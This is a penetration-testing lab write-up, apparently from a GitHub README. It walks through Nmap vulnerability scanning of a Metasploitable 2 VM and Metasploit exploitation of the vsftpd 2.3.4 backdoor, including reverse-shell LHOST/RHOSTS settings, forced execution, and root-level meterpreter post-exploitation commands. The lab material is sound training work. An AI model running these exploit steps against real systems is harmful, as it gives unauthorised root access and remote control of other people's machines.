# Network-VAPT-Metasploitable
Hands-on vulnerability assessment and penetration testing lab on Metasploitable 2 using Kali Linux and Metasploit.

# Initial Reconnaissance and Vulnerability Scanning
- Nmap (Network Mapper) is an open-source tool used by security professionals to scan networks,
- discover active devices, find open ports, and identify running services along with their security
  flaws.
-  In a VAPT workflow, Nmap acts as the primary tool during the reconnaissance phase to build a
  map of the target's attack surface

# Command Used in This Step

-sudo nmap --script=vuln 192.168.0.113

<img width="1920" height="950" alt="image" src="https://github.com/user-attachments/assets/7416f651-3bdd-4e8c-ba7b-cafa7645e3d1" />

# What this command does. 

- sudo: Runs the command with administrative privileges, which allows Nmap to craft raw network packets for accurate scanning.
- nmap: Invokes the scanner tool
- script=vuln: Triggers Nmap’s built-in Scripting Engine (NSE) vulnerability categories to check the open ports against known security vulnerabilities (CVEs).
- 192.168.0.113: The target IP address (Metasploitable instance) being assessed.
  
### Target Selection Based on Scan Results
- Based on the initial Nmap scan, two specific services were selected for exploitation due to their known critical vulnerabilities:
- 1. FTP (`vsftpd` on Port 21):** The scan revealed `vsftpd 2.3.4` running on port 21, which contains a well known built in backdoor allowing instant root-level shell access.
- 2. Samba (SMB on Ports 139/445):** The active Samba service was targeted due to a command injection vulnerability (`usermap_script`), enabling remote code execution (RCE) with administrative privileges.
- These two entry points were prioritized to demonstrate service-level exploitation and privilege.



### Phase 2: Exploitation - vsftpd 2.3.4 Backdoor

### Step 1 Launching Metasploit and Searching for the Exploit Module

- After identifying the open FTP service during the scanning phase, I opened a new terminal and launched the Metasploit Framework console (`msfconsole`). 
- I then searched for available exploit modules targeting the `vsftpd` service using the following command.
-bash
- msfconsole
- msf > search vsftp
<img width="1920" height="950" alt="Screenshot_2026-10-17_12_01_18" src="https://github.com/user-attachments/assets/f10b3e83-e9a8-4f7e-bff0-4313695ce6b1" />
# Observations & Output:

# The search query returned two matching modules:   

- 0 auxiliary/dos/ftp/vsftpd_232 (Denial of Service).

- 1 exploit/unix/ftp/vsftpd_234_backdoor (VSFTPD 2.3.4 Backdoor Command Execution).

- msf > use 1
  
### Step 2: Inspecting Exploit Options

Once the `vsftpd_234_backdoor` module was selected, I inspected the configurable parameters and payload options to ensure everything was properly aligned before launching the attack.

bash
- msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options.
<img width="1920" height="950" alt="Screenshot_2026-10-17_12_01_36" src="https://github.com/user-attachments/assets/d9dc34b9-9081-460d-9ea3-9e6326bc42bf" />


# Commands Explained:

show options: Displays all the configurable parameters for the selected exploit module and its payload.

- RHOSTS: The remote host parameter where we must specify our target IP address (192.168.0.113).

- RPORT: The target port parameter, which is set to 21 by default for the FTP service.

- Payload Settings: The default payload (cmd/linux/http/x86/meterpreter_reverse_tcp) handles the connection back to our attack machine once the backdoor is triggered.

### Step 3: Configuring Target and Local Host Parameters

Before launching the attack, I configured the required parameters so the exploit knows where to send the attack and where to receive the incoming connection.

bash
- msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.0.113
- msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST 192.168.0.139
- msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

<img width="1920" height="950" alt="Screenshot_2026-10-17_12_02_40" src="https://github.com/user-attachments/assets/b6dc6cc8-ac1c-4ecd-b740-6410a6361ded" />

# Commands Explained:

- set RHOSTS 192.168.0.113: Defines the Remote Host (target machine IP address) that we want to exploit.

- set LHOST 192.168.0.139: Defines the Local Host (our attacker/Kali Linux machine IP address) so the target knows where to send the reverse shell connection back.

- show options: Verified again to ensure both RHOSTS and LHOST were updated successfully before executing the exploit.


### Step 4: Executing the Exploit & Establishing a Meterpreter Session

After configuring the target and local IP addresses, I disabled the automatic check to force the exploit execution and successfully launched the attack against the target machine.

bash
- msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set AutoCheck false
- msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set ForceExploit true
- msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

  <img width="1920" height="950" alt="Screenshot_2026-10-17_12_03_49" src="https://github.com/user-attachments/assets/dcd86fce-bce0-4cdf-89be-500cf8d0cd56" />

What is Meterpreter. 

Meterpreter is an advanced, dynamically extensible payload used within the Metasploit Framework. Unlike a standard basic command shell, Meterpreter runs completely in memory (in-the-ram) on the target system, making it harder to detect by traditional security solutions. It provides a feature-rich environment to interact with the compromised system, execute commands, gather system information, and extract files seamlessly.

Exploit Execution & Post-Exploitation Commands:

1. Triggering the Exploit

The exploit successfully triggered the hidden backdoor vulnerability on port 21.

Spawned a reverse TCP handler and established an active connection back to our Kali Linux machine (192.168.0.139), resulting in: Meterpreter session 1 opened.

2. Checking System Information

- meterpreter > sysinfo

Purpose: Displays details about the target system.

Observation: Confirmed the target is running an Ubuntu 8.04 server environment with an x86 architecture.

3. Verifying Privileges (getuid):
- meterpreter > getuid
  
Purpose: Identifies the current user context of our session.

Observation: Confirmed that we successfully gained root level privileges (highest administrative access on the system).

4. Network Interface Enumeration (ifconfig):
meterpreter > ifconfig

Purpose: Lists the network configuration and active interfaces of the compromised target.

Observation: Verified the target's internal IP address (192.168.0.113) and loopback interface.

